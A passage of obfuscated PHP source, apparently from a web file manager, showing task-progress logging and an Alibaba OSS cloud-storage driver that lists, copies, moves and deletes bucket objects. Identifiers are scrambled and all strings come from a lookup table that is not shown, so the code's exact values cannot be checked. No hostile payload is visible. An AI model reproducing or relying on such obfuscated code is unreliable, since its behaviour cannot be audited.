self::log($‘ÂşÈ[1846] . $this->task[$‘ÂşÈ[475]]); $this->end(); } public function progress($¾Õøçì¡, $ºŠ‚ö­¿, $ŒÅƒà¦ñ, $ÂŒİ‡ùÏ, $—¡õüÓ) { $›×ÄˆÙ =& $_SERVER[Ş­ğŠìÒ]; $¯¿Ùúåˆ =& $this->task; if ($—¡õüÓ > 0) { $¯¿Ùúåˆ[$›×ÄˆÙ[1137]] = $¯¿Ùúåˆ[$›×ÄˆÙ[1137]] == 0 ? $ÂŒİ‡ùÏ : $¯¿Ùúåˆ[$›×ÄˆÙ[1137]]; $¯¿Ùúåˆ[$›×ÄˆÙ[1765]] = $—¡õüÓ; } else { if ($ŒÅƒà¦ñ > 0) { $¯¿Ùúåˆ[$›×ÄˆÙ[1137]] = $¯¿Ùúåˆ[$›×ÄˆÙ[1137]] == 0 ? $ºŠ‚ö­¿ : $¯¿Ùúåˆ[$›×ÄˆÙ[1137]]; $¯¿Ùúåˆ[$›×ÄˆÙ[1765]] = $ŒÅƒà¦ñ; } } $this->update(); self::log("\160\162\157\x67\162\145\163\x73\x48\164\164\x70\x3a\144\x6f\167\156\72{$ŒÅƒà¦ñ}\x2f{$ºŠ‚ö­¿}\73\x20\165\160\x6c\157\x61\x64\72{$—¡õüÓ}\57{$ÂŒİ‡ùÏ}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Õï—Óóò, $©›Úûó = '', $µî¸ˆ¡ = 0, $ëíÜ»â¡ = '') { $äÛÊ·àˆ =& $_SERVER[Ş­ğŠìÒ]; $ëíÜ»â¡ = $ëíÜ»â¡ ? $ëíÜ»â¡ : ($©›Úûó ? $©›Úûó : $Õï—Óóò); $´Õß¥İ€ = new Task($Õï—Óóò, $©›Úûó, $µî¸ˆ¡, $ëíÜ»â¡); $GLOBALS[$äÛÊ·àˆ[1847] . $Õï—Óóò] = new TaskLog($äÛÊ·àˆ[1748], $´Õß¥İ€, $ëíÜ»â¡); return $´Õß¥İ€; } public function __construct($†«”¸ö´ = '', $ñ«ô‹Ô = '', $Ãæ»°¢Ó = '') { $Â¹¤ÃŒÛ =& $_SERVER[Ş­ğŠìÒ]; if (!$†«”¸ö´) { $†«”¸ö´ = $Â¹¤ÃŒÛ[1748]; } $éß•²ıÈ = $†«”¸ö´ . $Â¹¤ÃŒÛ[462] . rand_string(10); if (!$Ãæ»°¢Ó) { $Ãæ»°¢Ó = $†«”¸ö´ . $Â¹¤ÃŒÛ[53] . $Ãæ»°¢Ó; } switch ($†«”¸ö´) { case $Â¹¤ÃŒÛ[1748]: if (!$ñ«ô‹Ô || !$ñ«ô‹Ô->task) { return echoLog($†«”¸ö´ . $Â¹¤ÃŒÛ[1848]); } $‘©¿æ‹ë = $ñ«ô‹Ô; $éß•²ıÈ = $‘©¿æ‹ë->task[$Â¹¤ÃŒÛ[475]]; $†«”¸ö´ = $‘©¿æ‹ë->task[$Â¹¤ÃŒÛ[475]]; if (!$‘©¿æ‹ë->task[$Â¹¤ÃŒÛ[1653]]) { $‘©¿æ‹ë->task[$Â¹¤ÃŒÛ[1653]] = $Ãæ»°¢Ó ? $Ãæ»°¢Ó : $†«”¸ö´; } break; case $Â¹¤ÃŒÛ[1849]: if (!$ñ«ô‹Ô) { return echoLog($†«”¸ö´ . $Â¹¤ÃŒÛ[1850]); } $òÓŞ»Ì– = is_string($ñ«ô‹Ô) ? array($ñ«ô‹Ô) : $ñ«ô‹Ô; $‘©¿æ‹ë = new TaskFileTransfer($éß•²ıÈ, $†«”¸ö´, 0, $Ãæ»°¢Ó ? $Ãæ»°¢Ó : $òÓŞ»Ì–[0]); foreach ($òÓŞ»Ì– as $Æˆ¹öíë) { $‘©¿æ‹ë->addPath($Æˆ¹öíë); } break; case $Â¹¤ÃŒÛ[389]: if (!$ñ«ô‹Ô) { return echoLog($†«”¸ö´ . $Â¹¤ÃŒÛ[1850]); } $òÓŞ»Ì– = is_string($ñ«ô‹Ô) ? array($ñ«ô‹Ô) : $ñ«ô‹Ô; $‘©¿æ‹ë = new TaskZip($éß•²ıÈ, $†«”¸ö´, 0, $Ãæ»°¢Ó ? $Ãæ»°¢Ó : $òÓŞ»Ì–[0]); foreach ($òÓŞ»Ì– as $Æˆ¹öíë) { $‘©¿æ‹ë->addPath($Æˆ¹öíë); } break; case $Â¹¤ÃŒÛ[1295]: if (!$ñ«ô‹Ô) { return echoLog($†«”¸ö´ . $Â¹¤ÃŒÛ[1850]); } $‘©¿æ‹ë = new TaskUnZip($éß•²ıÈ, $†«”¸ö´, 0, $Ãæ»°¢Ó ? $Ãæ»°¢Ó : $ñ«ô‹Ô); if ($ñ«ô‹Ô) { $‘©¿æ‹ë->addFile($ñ«ô‹Ô); } break; case $Â¹¤ÃŒÛ[152]: $‘©¿æ‹ë = new TaskHttp($éß•²ıÈ, $†«”¸ö´); break; default: return; break; } $this->task = $‘©¿æ‹ë; $this->taskID = $éß•²ıÈ; Hook::bind($Â¹¤ÃŒÛ[1785], array($this, $Â¹¤ÃŒÛ[1851])); Hook::bind($Â¹¤ÃŒÛ[1787], array($this, $Â¹¤ÃŒÛ[1852])); Hook::bind($Â¹¤ÃŒÛ[1781], array($this, $Â¹¤ÃŒÛ[1853])); echoLog($Â¹¤ÃŒÛ[1854] . $‘©¿æ‹ë->task[$Â¹¤ÃŒÛ[1653]]); } public function __destruct() { $this->end(); } public function end($Ÿúª¯¾ü = '') { $î¨öÌ×¤ =& $_SERVER[Ş­ğŠìÒ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Ÿúª¯¾ü); $this->task = !1; $this->taskID = !1; Hook::unbind($î¨öÌ×¤[1785], array($this, $î¨öÌ×¤[1851])); Hook::unbind($î¨öÌ×¤[1787], array($this, $î¨öÌ×¤[1852])); Hook::unbind($î¨öÌ×¤[1781], array($this, $î¨öÌ×¤[1853])); } public function taskUpdate($ÏŞéÏŒ¿) { $á™ªìâ =& $_SERVER[Ş­ğŠìÒ]; if (!$ÏŞéÏŒ¿ || $this->taskID != $ÏŞéÏŒ¿[$á™ªìâ[475]]) { return; } $µ®´€Á = 20; $×Ù‡Ş‚æ = intval($ÏŞéÏŒ¿[$á™ªìâ[1766]] * $µ®´€Á); $ã‰¬¢Âß = $á™ªìâ[176] . str_repeat($á™ªìâ[957], $×Ù‡Ş‚æ) . $á™ªìâ[1088] . str_repeat($á™ªìâ[53], $µ®´€Á - $×Ù‡Ş‚æ) . $á™ªìâ[178]; $ÍÙá¦Şå = $ã‰¬¢Âß . sprintf($á™ªìâ[1855], $ÏŞéÏŒ¿[$á™ªìâ[1766]] * 100) . $á™ªìâ[1856]; $¢°¾İ ë = $ÍÙá¦Şå . $ÏŞéÏŒ¿[$á™ªìâ[1765]] . $á™ªìâ[8] . $ÏŞéÏŒ¿[$á™ªìâ[1137]] . LNG($á™ªìâ[1857]); $á²¨ãºê = $á™ªìâ[12]; if ($ÏŞéÏŒ¿[$á™ªìâ[1841]]) { $¢°¾İ ë = $ÍÙá¦Şå . size_format($ÏŞéÏŒ¿[$á™ªìâ[1765]]) . $á™ªìâ[8] . size_format($ÏŞéÏŒ¿[$á™ªìâ[1137]]); $á²¨ãºê = size_format($ÏŞéÏŒ¿[$á™ªìâ[1767]]) . $á™ªìâ[1858]; } if ($ÏŞéÏŒ¿[$á™ªìâ[1139]]) { $ÏŞéÏŒ¿[$á™ªìâ[1815]] = $ÏŞéÏŒ¿[$á™ªìâ[1139]] . $á™ªìâ[53] . $ÏŞéÏŒ¿[$á™ªìâ[1815]]; } if ($ÏŞéÏŒ¿[$á™ªìâ[1815]]) { $ìëĞªû = $á™ªìâ[12]; if ($ÏŞéÏŒ¿[$á™ªìâ[1817]]) { $ìëĞªû = $á™ªìâ[50] . size_format($ÏŞéÏŒ¿[$á™ªìâ[1818]]) . $á™ªìâ[8] . size_format($ÏŞéÏŒ¿[$á™ªìâ[1817]]); } $á²¨ãºê .= $ÏŞéÏŒ¿[$á™ªìâ[1815]] . $ìëĞªû; } if ($ÏŞéÏŒ¿[$á™ªìâ[830]] && !$ÏŞéÏŒ¿[$á™ªìâ[1817]]) { $á²¨ãºê .= $á™ªìâ[53] . size_format($ÏŞéÏŒ¿[$á™ªìâ[1822]]) . $á™ªìâ[8] . size_format($ÏŞéÏŒ¿[$á™ªìâ[830]]); } echoLog($¢°¾İ ë . $á™ªìâ[53] . $á²¨ãºê, !0); } public function taskEnd($«ßÇÀúô) { $÷Ş¯ëåÑ =& $_SERVER[Ş­ğŠìÒ]; if (!$«ßÇÀúô || $this->taskID != $«ßÇÀúô[$÷Ş¯ëåÑ[475]]) { return; } $«°ÑÂ¾‰ = $«ßÇÀúô ? $«ßÇÀúô[$÷Ş¯ëåÑ[1765]] . $÷Ş¯ëåÑ[8] . $«ßÇÀúô[$÷Ş¯ëåÑ[1137]] . LNG($÷Ş¯ëåÑ[1857]) . $÷Ş¯ëåÑ[74] : $÷Ş¯ëåÑ[12]; echoLog($÷Ş¯ëåÑ[1859] . $«ßÇÀúô[$÷Ş¯ëåÑ[1653]] . ($«ßÇÀúô[$÷Ş¯ëåÑ[526]] ? $÷Ş¯ëåÑ[74] . $«ßÇÀúô[$÷Ş¯ëåÑ[526]] : $÷Ş¯ëåÑ[12]) . $÷Ş¯ëåÑ[74] . $«°ÑÂ¾‰ . $÷Ş¯ëåÑ[1860] . sprintf($÷Ş¯ëåÑ[917], timeFloat() - $«ßÇÀúô[$÷Ş¯ëåÑ[1768]]) . $÷Ş¯ëåÑ[1780]); $this->end(); } public function taskKill($û³²üíû) { $‡õ ÒÅü =& $_SERVER[Ş­ğŠìÒ]; if (!$û³²üíû || $this->taskID != $û³²üíû[$‡õ ÒÅü[475]]) { return; } echoLog($‡õ ÒÅü[1861] . $û³²üíû[$‡õ ÒÅü[1653]]); } } goto B¥®¡İææ; f¾÷£¯Ò—: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($øÙ·Œâ„) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ş­ğŠìÒ][1456]; $this->_init($øÙ·Œâ„); } public function _init($çËº—¬†) { $íÏÀÌÈİ =& $_SERVER[Ş­ğŠìÒ]; $this->config = $çËº—¬†; foreach ($çËº—¬† as $ïºóé•² => $Ä›Ö×¥¤) { if (isset($this->{$ïºóé•²})) { $this->{$ïºóé•²} = $Ä›Ö×¥¤; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($íÏÀÌÈİ[1457] . LNG($íÏÀÌÈİ[1458])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ÒÈÅ’ñş =& $_SERVER[Ş­ğŠìÒ]; $ÁÖåïÂù = new OSS\Model\CorsConfig(); $–Ä¹Î‰ = new OSS\Model\CorsRule(); $–Ä¹Î‰->addAllowedOrigin($ÒÈÅ’ñş[1459]); $–Ä¹Î‰->addAllowedMethod($ÒÈÅ’ñş[1460]); $–Ä¹Î‰->addAllowedMethod($ÒÈÅ’ñş[1461]); $–Ä¹Î‰->addAllowedMethod($ÒÈÅ’ñş[1462]); $–Ä¹Î‰->addAllowedMethod($ÒÈÅ’ñş[1463]); $–Ä¹Î‰->addAllowedMethod($ÒÈÅ’ñş[165]); $–Ä¹Î‰->setMaxAgeSeconds(600); $–Ä¹Î‰->addExposeHeader($ÒÈÅ’ñş[1464]); $–Ä¹Î‰->addAllowedHeader($ÒÈÅ’ñş[1459]); $ÁÖåïÂù->addRule($–Ä¹Î‰); try { $this->client->putBucketCors($this->bucket, $ÁÖåïÂù); } catch (OSS\Core\OssException $çµÃ”¾ï) { $this->writeLog(__FUNCTION__ . $ÒÈÅ’ñş[214] . $çµÃ”¾ï->getMessage()); return !1; } return !0; } public function getBucketCors() { $§ğ­ûØŠ =& $_SERVER[Ş­ğŠìÒ]; $Æşèú”… = null; try { $Æşèú”… = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $”ûƒÅÆÑ) { $this->writeLog(__FUNCTION__ . $§ğ­ûØŠ[214] . $”ûƒÅÆÑ->getMessage()); return null; } if (!$Æşèú”… || !($Úı“Ç¡ú = $Æşèú”…->getRules())) { return null; } $ûÂ¹Şª = $Úı“Ç¡ú[0]->getAllowedOrigins(); $ê÷«¡—î = $Úı“Ç¡ú[0]->getAllowedMethods(); $¬©§æòà = $Úı“Ç¡ú[0]->getMaxAgeSeconds(); $úç«ÀÏÌ = $Úı“Ç¡ú[0]->getExposeHeaders(); $±õ’ì‰ = $Úı“Ç¡ú[0]->getAllowedHeaders(); return array($§ğ­ûØŠ[218] => isset($ûÂ¹Şª[0]) ? $ûÂ¹Şª[0] : $§ğ­ûØŠ[12], $§ğ­ûØŠ[222] => $ê÷«¡—î, $§ğ­ûØŠ[1465] => $¬©§æòà, $§ğ­ûØŠ[1466] => isset($úç«ÀÏÌ[0]) ? $úç«ÀÏÌ[0] : $§ğ­ûØŠ[12], $§ğ­ûØŠ[219] => isset($±õ’ì‰[0]) ? $±õ’ì‰[0] : $§ğ­ûØŠ[12]); } public function isBucketCors() { $ÓïÖƒ‰ö =& $_SERVER[Ş­ğŠìÒ]; $æÜÂúñâ = $this->getBucketCors(); if (!$æÜÂúñâ || !is_array($æÜÂúñâ)) { return !1; } if ($æÜÂúñâ[$ÓïÖƒ‰ö[218]] != $ÓïÖƒ‰ö[220] || $æÜÂúñâ[$ÓïÖƒ‰ö[219]] != $ÓïÖƒ‰ö[220]) { return !1; } $¾àÌ÷éõ = array_map($ÓïÖƒ‰ö[221], $æÜÂúñâ[$ÓïÖƒ‰ö[222]]); if (!is_array($¾àÌ÷éõ)) { $¾àÌ÷éõ = array(); } $®ø€¬ı‘ = array($ÓïÖƒ‰ö[223], $ÓïÖƒ‰ö[224], $ÓïÖƒ‰ö[225], $ÓïÖƒ‰ö[226], $ÓïÖƒ‰ö[227]); $•¦±À¥ó = array_diff($®ø€¬ı‘, $¾àÌ÷éõ); return empty($•¦±À¥ó); } public function mkfile($ªú´ø¡í, $£ŸØ¸¦Ù = '', $³ÛŞ€ = REPEAT_RENAME) { $ÛÍãøßù = $this->setContent($ªú´ø¡í, $£ŸØ¸¦Ù); if ($ÛÍãøßù !== !1) { return $this->getPathOuter($ªú´ø¡í); } return !1; } public function mkdir($ì­™ìâ†, $íœ—ˆÔã = REPEAT_SKIP) { if ($íœ—ˆÔã && $this->_isFolder($ì­™ìâ†)) { return $this->getPathOuter($ì­™ìâ†); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ì­™ìâ†)); } catch (OSS\Core\OssException $¡ğòüõï) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][214] . $¡ğòüõï->getMessage()); return !1; } return $this->getPathOuter($ì­™ìâ†); } private function fileList($¸€«Ò¶, $ìƒÕ¤°Í = '', $âÖ²º‡ = 0) { $¨ó„‰™€ =& $_SERVER[Ş­ğŠìÒ]; $¸€«Ò¶ = trim($¸€«Ò¶, $¨ó„‰™€[8]); $ôÖí¾ƒ… = empty($¸€«Ò¶) && $¸€«Ò¶ !== $¨ó„‰™€[228] ? $¨ó„‰™€[12] : $¸€«Ò¶ . $¨ó„‰™€[8]; $ØÀ•¢ü¦ = $¨ó„‰™€[12]; $¥ãêíÕ = 1000; $ÏØÉÓ¢¦ = $Ë¨åï˜ = array(); while (!0) { check_abort(); $Çîí–¯á = array($¨ó„‰™€[1467] => $ìƒÕ¤°Í, $¨ó„‰™€[1468] => $ôÖí¾ƒ…, $¨ó„‰™€[1469] => $¥ãêíÕ, $¨ó„‰™€[1470] => $ØÀ•¢ü¦); try { $»¼ƒ«¦ = $this->client->listObjects($this->bucket, $Çîí–¯á); } catch (OSS\Core\OssException $ü§¿ŞŠ) { $this->writeLog(__FUNCTION__ . $¨ó„‰™€[214] . $ü§¿ŞŠ->getMessage()); break; } $ØÀ•¢ü¦ = $»¼ƒ«¦->getNextMarker(); $¦¦áØê§ = $»¼ƒ«¦->getObjectList(); $»£ªŞ¦ = $»¼ƒ«¦->getPrefixList(); foreach ($¦¦áØê§ as $ù°ÎğÍ) { if ($ù°ÎğÍ->getKey() == $ôÖí¾ƒ…) { continue; } $Ê‹Óıı‰ = $ù°ÎğÍ->getKey(); $êòÜ¨’¤ = $ù°ÎğÍ->getSize(); $ÉÌ±ëı² = $ù°ÎğÍ->getLastModified(); $¸ìİƒæ‡ = trim($ù°ÎğÍ->getETag(), $¨ó„‰™€[121]); $»³¼€¶Ì = $âÖ²º‡ ? array($¨ó„‰™€[32] => $Ê‹Óıı‰, $¨ó„‰™€[79] => $êòÜ¨’¤, $¨ó„‰™€[206] => strtotime($ÉÌ±ëı²), $¨ó„‰™€[1471] => $¸ìİƒæ‡) : $Ê‹Óıı‰; $–·¶ª˜ó = $êòÜ¨’¤ == 0 && substr($Ê‹Óıı‰, strlen($Ê‹Óıı‰) - 1, 1) == $¨ó„‰™€[8] ? !0 : !1; $¤ºğÒÄÜ = array($¨ó„‰™€[79] => $êòÜ¨’¤, $¨ó„‰™€[1472] => $êòÜ¨’¤, $¨ó„‰™€[88] => strtotime($ÉÌ±ëı²), $¨ó„‰™€[1473] => $ÉÌ±ëı², $¨ó„‰™€[1471] => $¸ìİƒæ‡); $this->cacheMethodInfoSet($Ê‹Óıı‰, $–·¶ª˜ó, $¤ºğÒÄÜ); if ($–·¶ª˜ó) { $ÏØÉÓ¢¦[] = $Ê‹Óıı‰; continue; } $Ë¨åï˜[] = $»³¼€¶Ì; } foreach ($»£ªŞ¦ as $ªÔçŒó) { $ÏØÉÓ¢¦[] = $ªÔçŒó->getPrefix(); $this->cacheMethodInfoSet($ªÔçŒó->getPrefix(), !0); } if ($ØÀ•¢ü¦ === $¨ó„‰™€[12]) { break; } } $this->cacheMethodInfoSet($¸€«Ò¶, !0); return array($¨ó„‰™€[85] => $ÏØÉÓ¢¦, $¨ó„‰™€[86] => $Ë¨åï˜); } public function listObject($œ¦¢»Ó°, $ùûø–ä» = '') { $•Ëù“¨ =& $_SERVER[Ş­ğŠìÒ]; $œ¦¢»Ó° = trim($œ¦¢»Ó°, $•Ëù“¨[8]); $£†ñüå« = empty($œ¦¢»Ó°) && $œ¦¢»Ó° !== $•Ëù“¨[228] ? $•Ëù“¨[12] : $œ¦¢»Ó° . $•Ëù“¨[8]; $¯±ÔèÊ© = $•Ëù“¨[12]; $úäñ¼Ã© = 1000; $¸å³äİŞ = $ˆ–¶ÉİÙ = array(); while (!0) { check_abort(); $÷ùÒÄÓş = array($•Ëù“¨[1467] => $ùûø–ä», $•Ëù“¨[1468] => $£†ñüå«, $•Ëù“¨[1469] => $úäñ¼Ã©, $•Ëù“¨[1470] => $¯±ÔèÊ©); try { $ÚµíÉª© = $this->client->listObjects($this->bucket, $÷ùÒÄÓş); } catch (OSS\Core\OssException $·ÃˆøÇ) { $this->writeLog(__FUNCTION__ . $•Ëù“¨[214] . $·ÃˆøÇ->getMessage()); break; } $¯±ÔèÊ© = $ÚµíÉª©->getNextMarker(); $ÏŸÎ¸³ü = $ÚµíÉª©->getObjectList(); foreach ($ÏŸÎ¸³ü as $ĞŸ‹éŸÕ) { if ($ĞŸ‹éŸÕ->getKey() == $£†ñüå«) { continue; } $«±àûšñ = $ĞŸ‹éŸÕ->getKey(); $Ê¬Ù™«ü = $ĞŸ‹éŸÕ->getSize(); $›ë´´Ï = $Ê¬Ù™«ü == 0 && substr($«±àûšñ, strlen($«±àûšñ) - 1, 1) == $•Ëù“¨[8] ? !0 : !1; if ($›ë´´Ï) { continue; } $ˆ–¶ÉİÙ[] = $Ê¬Ù™«ü . $•Ëù“¨[214] . $«±àûšñ; } if ($¯±ÔèÊ© === $•Ëù“¨[12]) { break; } } return array($•Ëù“¨[85] => $¸å³äİŞ, $•Ëù“¨[86] => $ˆ–¶ÉİÙ); } public function copyFile($¯ø–¢¹Ú, $Îø£Á ) { $Ï¥¥Ş…ò = $this->size($¯ø–¢¹Ú); if ($Ï¥¥Ş…ò < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¯ø–¢¹Ú, $this->bucket, $this->pathEncode($Îø£Á )); } catch (OSS\Core\OssException $—ÇİñÎì) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][214] . $—ÇİñÎì->getMessage()); return !1; } return $this->getPathOuter($Îø£Á ); } $È·ñ„ƒï = $this->multiCopyObject($¯ø–¢¹Ú, $Îø£Á , $Ï¥¥Ş…ò); return $È·ñ„ƒï ? $this->getPathOuter($Îø£Á ) : !1; } private function multiCopyObject($Ÿ¡··Š®, $–æ•ıç•, $¿›’íï¤) { $áÜšåªö =& $_SERVER[Ş­ğŠìÒ]; try { $„ñËĞ©¼ = array(); if ($À—ÕÕ°ø = $this->hashMd5($Ÿ¡··Š®)) { $„ñËĞ©¼ = array(OSS\OssClient::OSS_HEADERS => array($áÜšåªö[1474] => $À—ÕÕ°ø)); } $±ÔàêßÅ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($–æ•ıç•), $„ñËĞ©¼); $Ñ»•ŒÖ = 1; $¥ï³ ÷« = 0; $Ğˆ”ååº = array(); $“¾ºŠÔÉ = 1024 * 1024 * 10; $‡‹Èã• = $this->client->generateMultiuploadParts($¿›’íï¤, $“¾ºŠÔÉ); foreach ($‡‹Èã• as $…ìôùíé => $Ÿ’¹ªÒ‡) { $†¬™´ = $¥ï³ ÷« + (int) $Ÿ’¹ªÒ‡[$áÜšåªö[1475]]; $‰ø»Ş¦• = (int) $Ÿ’¹ªÒ‡[$áÜšåªö[413]] + $†¬™´ - 1; $Ô°„Û¶ = array($áÜšåªö[167] => $†¬™´, $áÜšåªö[168] => $‰ø»Ş¦•); $Ğˆ”ååº[] = $this->client->uploadPartCopy($this->bucket, $Ÿ¡··Š®, $this->bucket, $this->pathEncode($–æ•ıç•), $Ñ»•ŒÖ, $±ÔàêßÅ, $Ô°„Û¶); $Ñ»•ŒÖ = $Ñ»•ŒÖ + 1; } $ÕæµšÏĞ = array(); foreach ($Ğˆ”ååº as $…ìôùíé => $ËÀìéËÓ) { $ÕæµšÏĞ[] = array($áÜšåªö[308] => $…ìôùíé + 1, $áÜšåªö[309] => $ËÀìéËÓ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($–æ•ıç•), $±ÔàêßÅ, $ÕæµšÏĞ); } catch (OSS\Core\OssException $ı£È–‰) { $this->writeLog(__FUNCTION__ . $áÜšåªö[214] . $ı£È–‰->getMessage()); return !1; } return !0; } public function moveFile($ã•ç„Ì, $Á‡àŞû) { if ($this->copyFile($ã•ç„Ì, $Á‡àŞû)) { $this->remove($ã•ç„Ì); return $this->getPathOuter($Á‡àŞû); } return !1; } public function delFile($¡á¶Å¬á) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¡á¶Å¬á)); } catch (OSS\Core\OssException $ôôääï) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][214] . $ôôääï->getMessage()); return !1; } return !0; } public function delFolder($ÏÄ‡Ÿ¤) { $—“ƒÉÅ‘ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->exist($ÏÄ‡Ÿ¤)) { return !0; } $this->listItemCache = !1; $„¥¡ì = $this->fileList($ÏÄ‡Ÿ¤); $this->listItemCache = !0; $úçºÁø¯ = trim($ÏÄ‡Ÿ¤, $—“ƒÉÅ‘[8]) . $—“ƒÉÅ‘[8]; if (!empty($ÏÄ‡Ÿ¤) && $ÏÄ‡Ÿ¤ !== $—“ƒÉÅ‘[228] && !in_array($úçºÁø¯, $„¥¡ì[$—“ƒÉÅ‘[85]])) { $„¥¡ì[$—“ƒÉÅ‘[85]][] = $úçºÁø¯; } $”»›İÂ = $this->delByBatch($„¥¡ì[$—“ƒÉÅ‘[86]]); if (!$”»›İÂ) { return !1; } $”»›İÂ = $this->delByBatch($„¥¡ì[$—“ƒÉÅ‘[85]]); if (!$”»›İÂ) { return !1; } return $this->delFile($úçºÁø¯); } private function delByBatch($ôÏµ³ğ´) { foreach (array_chunk($ôÏµ³ğ´, 1000) as $Îìİï®) { try { $this->client->deleteObjects($this->bucket, $Îìİï®); } catch (OSS\Core\OssException $ÛÔ‰¢ªÂ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][214] . $ÛÔ‰¢ªÂ->getMessage()); return !1; } } return !0; } public function rename($›ú£Ì÷ , $íˆ†²¯) { return $this->renameObject($›ú£Ì÷ , $íˆ†²¯); } private function fileInfo($‡†šæ™ï, $¸éŒÏ¤Ÿ = false, $Â¿¯Î£á = array()) { $ë”“áÊ =& $_SERVER[Ş­ğŠìÒ]; $·çÂ¥§§ = array($ë”“áÊ[32] => $this->pathThis($‡†šæ™ï), $ë”“áÊ[87] => $this->getPathOuter($‡†šæ™ï), $ë”“áÊ[33] => $ë”“áÊ[230], $ë”“áÊ[79] => isset($Â¿¯Î£á[$ë”“áÊ[79]]) ? $Â¿¯Î£á[$ë”“áÊ[79]] : 0, $ë”“áÊ[169] => $this->ext($‡†šæ™ï)); if ($¸éŒÏ¤Ÿ) { return $·çÂ¥§§; } $·çÂ¥§§[$ë”“áÊ[231]] = $·çÂ¥§§[$ë”“áÊ[88]] = 0; $·çÂ¥§§[$ë”“áÊ[232]] = $·çÂ¥§§[$ë”“áÊ[233]] = !0; if (empty($Â¿¯Î£á)) { $‹‡­ÇÙƒ = $this->objectMeta($‡†šæ™ï); if (!$‹‡­ÇÙƒ) { return $·çÂ¥§§; } $Â¿¯Î£á = array($ë”“áÊ[88] => strtotime($‹‡­ÇÙƒ[$ë”“áÊ[1473]]), $ë”“áÊ[79] => $‹‡­ÇÙƒ[$ë”“áÊ[1472]] + 0, $ë”“áÊ[1471] => $‹‡­ÇÙƒ[$ë”“áÊ[1471]]); } if (isset($Â¿¯Î£á[$ë”“áÊ[1471]]) && $Â¿¯Î£á[$ë”“áÊ[1471]]) { $·çÂ¥§§[$ë”“áÊ[235]] = trim($Â¿¯Î£á[$ë”“áÊ[1471]], $ë”“áÊ[121]); } if (isset($Â¿¯Î£á[$ë”“áÊ[79]])) { $·çÂ¥§§[$ë”“áÊ[79]] = $Â¿¯Î£á[$ë”“áÊ[79]]; } if (isset($Â¿¯Î£á[$ë”“áÊ[88]])) { $·çÂ¥§§[$ë”“áÊ[88]] = $Â¿¯Î£á[$ë”“áÊ[88]]; } if (isset($Â¿¯Î£á[$ë”“áÊ[206]]) && !trim($·çÂ¥§§[$ë”“áÊ[88]])) { $·çÂ¥§§[$ë”“áÊ[88]] = $Â¿¯Î£á[$ë”“áÊ[206]]; } return $·çÂ¥§§; } private function folderInfo($…ŸÆí…ë, $šİıÔ» = false, $¾éÍÒºà = array()) { $ç«Öü× =& $_SERVER[Ş­ğŠìÒ]; $¡Ç–Ïšğ = array($ç«Öü×[32] => $this->pathThis($…ŸÆí…ë), $ç«Öü×[87] => $this->getPathOuter($ç«Öü×[8] . $…ŸÆí…ë), $ç«Öü×[33] => $ç«Öü×[78]); if ($šİıÔ») { return $¡Ç–Ïšğ; } $¡Ç–Ïšğ[$ç«Öü×[231]] = $¡Ç–Ïšğ[$ç«Öü×[88]] = 0; $¡Ç–Ïšğ[$ç«Öü×[232]] = $¡Ç–Ïšğ[$ç«Öü×[233]] = !0; if (empty($¾éÍÒºà)) { $…ŸÆí…ë = rtrim($…ŸÆí…ë, $ç«Öü×[8]) . $ç«Öü×[8]; $ãö¡ªá€ = $this->objectMeta($…ŸÆí…ë); if (!$ãö¡ªá€) { return $¡Ç–Ïšğ; } $¾éÍÒºà = array($ç«Öü×[231] => $ãö¡ªá€[$ç«Öü×[575]][$ç«Öü×[1476]], $ç«Öü×[88] => strtotime($ãö¡ªá€[$ç«Öü×[1473]])); } if (isset($¾éÍÒºà[$ç«Öü×[88]])) { $¡Ç–Ïšğ[$ç«Öü×[88]] = $¾éÍÒºà[$ç«Öü×[88]]; } if (isset($¾éÍÒºà[$ç«Öü×[231]])) { $¡Ç–Ïšğ[$ç«Öü×[231]] = $¾éÍÒºà[$ç«Öü×[231]]; } return $¡Ç–Ïšğ; } public function listPath($ºÂ“¶àŞ, $Ë•Ö½–€ = false) { $Óå»Ç°Â =& $_SERVER[Ş­ğŠìÒ]; $¿‚èõ­Ø = $this->fileList($ºÂ“¶àŞ, $Óå»Ç°Â[8], !0); foreach ($¿‚èõ­Ø[$Óå»Ç°Â[85]] as $ë„ó¤¡³ => $Îı’«øÍ) { $¿‚èõ­Ø[$Óå»Ç°Â[85]][$ë„ó¤¡³] = $this->folderInfo($Îı’«øÍ, $Ë•Ö½–€, $Îı’«øÍ); } foreach ($¿‚èõ­Ø[$Óå»Ç°Â[86]] as $ë„ó¤¡³ => $Îı’«øÍ) { $¿‚èõ­Ø[$Óå»Ç°Â[86]][$ë„ó¤¡³] = $this->fileInfo($Îı’«øÍ[$Óå»Ç°Â[32]], $Ë•Ö½–€, $Îı’«øÍ); } return $¿‚èõ­Ø; } protected function infoChildren($ãÇªññ, &$®òÉñ³) { $®¢í¥À =& $_SERVER[Ş­ğŠìÒ]; $¦úÇ—“Ø = $this->fileList($ãÇªññ, $®¢í¥À[12], !0); $®òÉñ³[$®¢í¥À[81]] += count($¦úÇ—“Ø[$®¢í¥À[85]]); $®òÉñ³[$®¢í¥À[80]] += count($¦úÇ—“Ø[$®¢í¥À[86]]); foreach ($¦úÇ—“Ø[$®¢í¥À[86]] as $¨ÅŠêÇ€) { if 